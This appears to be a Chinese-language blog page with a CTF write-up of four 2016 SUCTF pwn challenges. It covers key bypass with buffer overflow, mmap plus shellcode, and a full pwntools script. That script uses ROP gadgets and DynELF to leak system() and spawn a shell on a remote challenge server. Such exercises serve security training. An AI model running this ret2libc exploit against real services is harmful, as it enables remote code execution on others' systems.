@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="做了SUCTF的pwn 记录一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2016-SUCTF-PWN-Writeup">
+<meta property="og:url" content="https://bestwing.me/2016-SUCTF-Writeup-pwn.html">
+<meta property="og:site_name" content="Swing&#39;Blog 有恨无人省">
+<meta property="og:description" content="做了SUCTF的pwn 记录一下">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-suctf-01.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-suctf-02.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-suctf-03.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/25929931.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/7110208.jpg">
+<meta property="article:published_time" content="2016-11-13T06:56:42.000Z">
+<meta property="article:modified_time" content="2019-10-28T13:27:35.000Z">
+<meta property="article:author" content="Swing">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="SUCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-suctf-01.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>2016-SUCTF-PWN-Writeup</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 有恨无人省" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/Second%20Shanghai%20college%20students%20'%20network%20security%20competition.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/As-a-Software%20security%20engineer-must-know-and-read-books-recommended.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/2016-SUCTF-Writeup-pwn.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/2016-SUCTF-Writeup-pwn.html&text=2016-SUCTF-PWN-Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/2016-SUCTF-Writeup-pwn.html&title=2016-SUCTF-PWN-Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/2016-SUCTF-Writeup-pwn.html&is_video=false&description=2016-SUCTF-PWN-Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2016-SUCTF-PWN-Writeup&body=Check out this article: https://bestwing.me/2016-SUCTF-Writeup-pwn.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/2016-SUCTF-Writeup-pwn.html&title=2016-SUCTF-PWN-Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/2016-SUCTF-Writeup-pwn.html&title=2016-SUCTF-PWN-Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/2016-SUCTF-Writeup-pwn.html&title=2016-SUCTF-PWN-Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/2016-SUCTF-Writeup-pwn.html&title=2016-SUCTF-PWN-Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/2016-SUCTF-Writeup-pwn.html&name=2016-SUCTF-PWN-Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/2016-SUCTF-Writeup-pwn.html&t=2016-SUCTF-PWN-Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E4%BD%A0%E7%9A%84hello-pwn"><span class="toc-number">1.</span> <span class="toc-text">这是你的hello pwn</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%8D%E6%9D%A5%E4%B8%80%E5%8F%91"><span class="toc-number">2.</span> <span class="toc-text">再来一发</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn300"><span class="toc-number">3.</span> <span class="toc-text">pwn300</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#simple"><span class="toc-number">4.</span> <span class="toc-text">simple</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        2016-SUCTF-PWN-Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Swing'Blog 有恨无人省</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2016-11-13T06:56:42.000Z" itemprop="datePublished">2016-11-13</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Writeup/">Writeup</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/SUCTF/" rel="tag">SUCTF</a>, <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>题目我已经打包好了放在百度云<br><a href="http://pan.baidu.com/s/1pL6gMZh">链接</a></p>
+<h1 id="这是你的hello-pwn"><a href="#这是你的hello-pwn" class="headerlink" title="这是你的hello pwn"></a>这是你的hello pwn</h1><p>这题是一个基础题，，只要绕过check，输入key - - ‘zhimakaimen’，就可以继续输入payload，然后覆盖到到关键函数</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-suctf-01.jpg"></p>
+<p>就能得到flag了</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-suctf-02.jpg"></p>
+<h1 id="再来一发"><a href="#再来一发" class="headerlink" title="再来一发"></a>再来一发</h1><p>这个题目比上个题目差在了一个地方，上个题目的getflag，是能直接getflag的，然而这个题目getflag是调用了system，这意味着我们可以在调用了system之后，可以在bss段写入/bin/sh起shell</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-suctf-03.jpg"></p>
+<h1 id="pwn300"><a href="#pwn300" class="headerlink" title="pwn300"></a>pwn300</h1><p>我本来在这个题目卡住了来着，在joker师傅的教导下学习了一下mmap的函数的利用。<br><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/25929931.jpg"><br>分析的时候发现这个程序是静态编译的，所以我们可以利用一下mmap函数。<br>mmap函数可以分出一段内存，这断内存的数据是可执行的，那么我们可以将shellcode写入这段内存，然后去getshell<br><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/7110208.jpg"></p>
+<h1 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h1><p>这个题目的思路是通过DynELF去leak  system函数地址，然后我们通过写入/bin/sh起shell</p>
+<p>这个题目只比pwn200多了一个leak  sysytem函数的步骤。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = remote(&quot;106.75.84.74&quot;, 10001)#pwn</span></span><br><span class="line">r = remote(<span class="string">&quot;23.106.148.10&quot;</span>,<span class="number">20000</span>)<span class="comment">#pwn</span></span><br><span class="line"><span class="comment">#r = process(&quot;./pwnme&quot;)</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">write_plt = <span class="number">0x00000000004004B0</span></span><br><span class="line">read_plt = <span class="number">0x00000000004004D0</span></span><br><span class="line">main = <span class="number">0x0000000004005F6</span></span><br><span class="line">bss = <span class="number">0x000000000600a70</span> + <span class="number">0x100</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004006c3</span></span><br><span class="line">pop_rsi_pop_r15_ret = <span class="number">0x00000000004006c1</span></span><br><span class="line"><span class="comment">#rdx === 0x100</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;luck!\n&quot;</span>)</span><br><span class="line">    payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x28</span></span><br><span class="line">    payload += p64(pop_rdi_ret)</span><br><span class="line">    payload += p64(<span class="number">0x1</span>)</span><br><span class="line">    payload += p64(pop_rsi_pop_r15_ret)</span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    payload += p64(<span class="number">0x6161616161616161</span>)</span><br><span class="line">    payload += p64(write_plt)</span><br><span class="line">    payload += p64(main)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    data = r.recv(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak, main, elf=ELF(<span class="string">&#x27;./simple&#x27;</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[*] system addr:&#123;0&#125;&quot;</span>.format(hex(system_addr))</span><br><span class="line">r.recvuntil(<span class="string">&quot;luck!\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x28</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(pop_rsi_pop_r15_ret)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(<span class="number">0x6161616161616161</span>)</span><br><span class="line">payload += p64(read_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;luck!\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x28</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E4%BD%A0%E7%9A%84hello-pwn"><span class="toc-number">1.</span> <span class="toc-text">这是你的hello pwn</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%8D%E6%9D%A5%E4%B8%80%E5%8F%91"><span class="toc-number">2.</span> <span class="toc-text">再来一发</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn300"><span class="toc-number">3.</span> <span class="toc-text">pwn300</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#simple"><span class="toc-number">4.</span> <span class="toc-text">simple</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/2016-SUCTF-Writeup-pwn.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/2016-SUCTF-Writeup-pwn.html&text=2016-SUCTF-PWN-Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/2016-SUCTF-Writeup-pwn.html&title=2016-SUCTF-PWN-Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/2016-SUCTF-Writeup-pwn.html&is_video=false&description=2016-SUCTF-PWN-Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2016-SUCTF-PWN-Writeup&body=Check out this article: https://bestwing.me/2016-SUCTF-Writeup-pwn.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/2016-SUCTF-Writeup-pwn.html&title=2016-SUCTF-PWN-Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/2016-SUCTF-Writeup-pwn.html&title=2016-SUCTF-PWN-Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/2016-SUCTF-Writeup-pwn.html&title=2016-SUCTF-PWN-Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/2016-SUCTF-Writeup-pwn.html&title=2016-SUCTF-PWN-Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/2016-SUCTF-Writeup-pwn.html&name=2016-SUCTF-PWN-Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/2016-SUCTF-Writeup-pwn.html&t=2016-SUCTF-PWN-Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    Swing
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-133464311-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'swing';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
